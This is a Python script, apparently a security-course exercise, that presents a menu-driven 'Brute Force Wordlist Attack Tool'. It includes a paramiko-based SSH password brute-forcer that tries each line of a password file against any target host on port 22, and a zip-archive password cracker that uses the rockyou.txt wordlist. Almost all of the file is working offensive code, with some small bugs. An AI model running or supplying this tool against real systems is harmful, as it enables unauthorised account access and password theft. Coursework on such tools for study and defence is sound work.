#!/usr/bin/env python3 

# Purpose - Brute Force Attacker
# Author - Tom Esch
# Last Revised - 5/12/2021

# Import libraries
import time, getpass, paramiko, sys, os, socket, zipfile
from tqdm import tqdm

# Declare variables
global host, username, line, input_file

# Declare functions
def iterator ():
    filepath = input("Enter your dictionary filepath:\n")
    #filepath = ~/ops401reading/python
    
    file = open(filepath, "r")
    line = file.readline()
    while line:
        line = line.rstrip()
        word = line
        print(word)
        time.sleep(1)
        line = file.readline()
    file.close()

# def check_password()
def recognizer ():
    searchstring = input("Enter the string you wish to search:\n")
    source = input("Enter your dictionary filepath:\n")

    with open(source, "r") as file:

        if searchstring in file.read():
            print("\nThe search string appeared in the word list.")
        else:
            print("\nThe search string did NOT--I repeat, did NOT--appear in the word list.")

def connectssh ():
    try:
        host = input("[*] Enter Target Host Address: ")
        username = input("[*] Enter SSH Username: ")
        input_file = input("[*] Enter SSH Password File: ")

        if os.path.exists(input_file) == False:
            print ("\n[*] File Path Does Not Exist !!!")
            sys.exit(4)
    except KeyboardInterrupt:
        print ("\n\n[*] User Requested An Interrupt")
        sys.exit(3)

    def ssh_connect(password, code = 0):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        try:
            ssh.connect(host, port=22, username=username, password=password)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error as e:
            code = 2

        ssh.close()
        return code

    input_file = open(input_file)

    print("")

    for i in input_file.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(password)

            if response == 0:
                print("%s[*] User: %s [*] Pass Found %s%s" % (line, username, password, line))
                sys.exit(0)
            elif response == 1:
                print("[*] User: %s [*] Pass: %s => Login Incorrect !!! <=" % (username, password))
            elif response == 2: 
                print("[*] Connection Could NOT Be Established To Address: %s" % (host)) 
                sys.exit(2)
        except Exception as e:
            print (e)
            pass

    input_file.close()

# Rockyou Decryption

def rockyoudecrypt():
    
    wordlist = "rockyou.txt"

    zip_file = input("Please specify the zip file to decrypt: ")

    zip_file = zipfile.ZipFile(zip_file)

    n_words = len(list(open(wordlist, "rb")))

    print("Total passwords to test:", n_words)

    with open(wordlist, "rb") as wordlist:
        for word in tqdm(wordlist, total=n_words, unit="word"):
            try:
                zip_file.extractall(pwd=word.strip())
            except:
                continue
            else:
                print("[+] Password found:", word.decode().strip())
                exit(0)
    print("[!] Password not found, try other wordlist.")
    
# Main

if __name__ == "__main__": # when my computer runs this file...do this stuff
    while True:
        mode = input("""
Brue Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - Offensive, SSH Password Brute
4 - Offensive, Zip Decrypt
5 - Exit
    Please enter a number: 
""")
        if (mode == "1"):
            iterator()
        elif (mode == "2"):
            recognizer()
        elif (mode == "3"):
            connectssh()
        elif (mode == "4"):
            rockyoudecrypt()
        elif (mode == '5'):
            break
        else:
            print("Invalid selection...") 
